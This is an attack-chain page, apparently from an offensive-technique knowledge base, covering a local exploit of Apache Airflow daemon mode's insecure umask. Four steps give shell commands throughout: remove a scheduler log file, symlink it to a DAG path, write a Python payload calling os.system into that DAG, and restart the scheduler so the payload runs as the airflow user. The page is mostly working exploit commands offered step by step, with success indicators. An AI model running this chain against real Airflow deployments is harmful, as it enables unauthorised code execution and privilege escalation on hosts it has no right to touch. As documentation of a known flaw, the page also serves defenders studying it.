---
tags:
  - airflow
  - umask
  - symlink
  - rce
  - privilege-escalation
type: attack_chain
tools: []
tactics:
  - '[[Privilege Escalation]]'
  - '[[Execution]]'
verified: false
platforms:
  - Linux
submitted: true
complexity: medium
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Prepare-Airflow-Environment-and-Set-Umask]]'
  - '[[procedures/Create-Symlink-in-Scheduler-Logs]]'
  - '[[procedures/Inject-Malicious-DAG-Code]]'
  - '[[procedures/Trigger-Airflow-Scheduler-Restart-for-Execution]]'
step_count: 4
techniques:
  - '[[Exploitation for Privilege Escalation]]'
  - '[[Unix Shell]]'
  - '[[Hijack Execution Flow]]'
updated_at: '2025-12-14T17:29:09.519Z'
description: >-
  Exploits insecure umask in Apache Airflow daemon mode to create world-writable
  files, enabling symlink attacks on logs to inject malicious DAGs for arbitrary
  code execution and privilege escalation.
skill_level: intermediate
impact_level: high
id: cd4a60b7-9d65-4aa5-84f6-6b5fac321a0e
validated: true
mitre_tactics:
  - '[[Privilege Escalation]]'
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploitation for Privilege Escalation]]'
  - '[[Unix Shell]]'
  - '[[Hijack Execution Flow]]'
---
# Airflow Daemon Mode Insecure Umask Leading to RCE via Symlink Injection

Multi-stage attack chain demonstrating exploitation of insecure permissions in Apache Airflow when running in daemon mode, allowing local attackers to inject malicious DAGs via symlinks in world-writable log directories, resulting in arbitrary code execution as the Airflow user and potential privilege escalation.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 4 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Prepare Environment] --> B[Create Symlink]
    B --> C[Inject Malicious DAG]
    C --> D[Trigger Execution]
    D --> E[RCE Achieved]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
    style D fill:#9b59b6
    style E fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- None (uses built-in Linux commands)

### Target Environment

- Linux OS
- Apache Airflow installed and running in daemon mode (--daemon flag)
- Local access to the Airflow user or shared environment with write access to logs
- Airflow home directory (e.g., /home/airflow) with scheduler logs enabled

### Initial Access Requirements

- Local user access on the Airflow host
- No network access required; assumes physical or shell access
- Airflow scheduler and webserver services running

## Detailed Attack Procedures

### Step 1: Prepare Environment
procedure: [[procedures/Prepare-Airflow-Environment-and-Set-Umask]]

**Objective**: Simulate or ensure insecure umask settings and navigate to the exploitable log directory to prepare for symlink creation.

**Instructions**: Set the umask to 0 to mimic the daemon mode vulnerability, then change to the scheduler logs directory.

Use [[commands/umask-0]] to set permissions:

```bash
umask 0
```

Followed by [[commands/cd-to-scheduler-logs]]:

```bash
cd $TARGET/logs/scheduler/latest/native_dags/example_dags
```

**Expected Output**: No output; directory changed successfully.

**Success Indicators**:
- Umask confirmed with `umask` command showing 0000
- Current directory is the logs path

### Step 2: Create Symlink in Scheduler Logs
procedure: [[procedures/Create-Symlink-in-Scheduler-Logs]]

**Objective**: Remove existing log file and create a symlink from the log to a target DAG file, exploiting world-writability to enable content injection.

**Instructions**: First, remove the existing log file using [[commands/rm-log-file]]:

```bash
rm example_bash_operator.py.log
```

Then create the symlink with [[commands/ln-symlink-to-dag]]:

```bash
ln -s $TARGET/dags/poc.py example_bash_operator.py.log
```

Wait for the target file to be accessible using [[commands/wait-for-poc-file]]:

```bash
until [ -f $TARGET/dags/poc.py ]; do sleep 1; done
```

Finally, clean up the symlink with [[commands/rm-symlink]]:

```bash
rm example_bash_operator.py.log
```

**Expected Output**: No output for each command; loop exits when file exists.

**Success Indicators**:
- Symlink created and verified with `ls -l`
- Target DAG file becomes writable
- Symlink removed without errors

### Step 3: Inject Malicious DAG Code
procedure: [[procedures/Inject-Malicious-DAG-Code]]

**Objective**: Write arbitrary Python code to the target DAG file, including a system command for RCE and minimal Airflow DAG definition to ensure processing.

**Instructions**: Use [[commands/write-malicious-dag]] to inject the payload:

```bash
(cat <<'EOF'
 import os
 os.system("id >>/tmp/pwned")
 from airflow import DAG
 EOF
 ) > $TARGET/dags/poc.py
```

**Expected Output**: No output; file created with malicious content.

**Success Indicators**:
- File poc.py exists and contains the injected code (verify with `cat $TARGET/dags/poc.py`)
- No syntax errors in the Python code

### Step 4: Trigger Execution
procedure: [[procedures/Trigger-Airflow-Scheduler-Restart-for-Execution]]

**Objective**: Restart the Airflow scheduler to process the injected DAG, executing the malicious code as the Airflow user.

**Instructions**: Manually restart the Airflow scheduler service (e.g., via systemd or supervisor). No direct command in PoC, but typically:

```bash
sudo systemctl restart airflow-scheduler
```

Monitor for execution by checking [[commands/os-system-id]] output in /tmp/pwned.

**Expected Output**: Scheduler restarts; malicious code runs, appending 'id' output to /tmp/pwned.

**Success Indicators**:
- /tmp/pwned file created with Airflow user details (e.g., uid=1000(airflow))
- Scheduler logs show DAG processing without errors

## Attack Chain Summary

### Key Achievements

1. Exploited insecure umask for world-writable logs
2. Injected malicious DAG via symlink without direct DAG access
3. Achieved RCE as Airflow user upon scheduler restart
4. Demonstrated privilege escalation potential in shared environments

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploitation for Privilege Escalation]] Exploitation for Privilege Escalation
- [[Unix Shell]] Unix Shell
- [[Hijack Execution Flow]] Hijack Execution Flow

### MITRE ATT&CK Tactics

- [[Privilege Escalation]] Privilege Escalation
- [[Execution]] Execution

---

*Last updated: 2023-10-01T00:00:00Z*
